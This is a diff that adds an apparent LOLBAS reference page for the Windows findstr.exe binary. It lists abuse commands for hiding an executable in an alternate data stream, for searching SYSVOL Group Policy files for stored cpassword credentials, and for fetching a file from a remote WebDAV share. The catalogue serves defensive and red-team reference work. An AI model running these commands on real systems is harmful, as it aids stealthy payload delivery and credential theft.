@@ -31,7 +31,133 @@
 </h1>
 
 
+<ul class="function-list">
+    
+    
+    <li><a href="/lolbas/Binaries/Findstr/#ads">Alternate data streams</a></li>
+    
+    
+    <li><a href="/lolbas/Binaries/Findstr/#credentials">Credentials</a></li>
+    
+    
+    <li><a href="/lolbas/Binaries/Findstr/#download">Download</a></li>
+    
+</ul>
 
+
+
+<br>
+<p><b>Paths:</b> 
+	<ul style="list-style-type:none">
+	
+	<li>c:\windows\system32\findstr.exe</li>
+	
+	<li>c:\windows\sysWOW64\findstr.exe</li>
+	 
+	</ul>
+</p>
+<br>
+<b>Resources:</b> 	
+	<ul style="list-style-type:none">
+	
+	<li><a href="https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/">https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/</a></li>
+	
+	<li><a href="https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f">https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f</a></li>
+	 
+	</ul>
+<br>
+<b>Contributors:</b> <p>Thanks to Oddvar Moe - @oddvarmoe</p>
+
+<br>
+
+
+
+
+
+
+<h2 id="ads" class="function-name">Alternate data streams</h2>
+
+<p>The LOLBAS can write or read alternate data streams.</p>
+
+
+<ul class="examples">
+
+    
+
+
+
+    <li>
+        <p>Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.</p>
+
+        <pre><code>findstr /V /L W3AllLov3DonaldTrump c:\ADS\file.exe > c:\ADS\file.txt:file.exe</code></pre>
+    </li>
+
+    
+
+
+
+    <li>
+        <p>Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.</p>
+
+        <pre><code>findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe</code></pre>
+    </li>
+
+    
+
+</ul>
+<br>
+
+
+
+
+
+<h2 id="credentials" class="function-name">Credentials</h2>
+
+<p>The LOLBAS can view credentials file.</p>
+
+
+<ul class="examples">
+
+    
+
+
+
+    <li>
+        <p>Search for stored password in Group Policy files stored on SYSVOL.</p>
+
+        <pre><code>findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml</code></pre>
+    </li>
+
+    
+
+</ul>
+<br>
+
+
+
+
+
+<h2 id="download" class="function-name">Download</h2>
+
+<p>The LOLBAS can download files.</p>
+
+
+<ul class="examples">
+
+    
+
+
+
+    <li>
+        <p>Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is downloaded to the target file.</p>
+
+        <pre><code>findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe</code></pre>
+    </li>
+
+    
+
+</ul>
+<br>
 
 
 
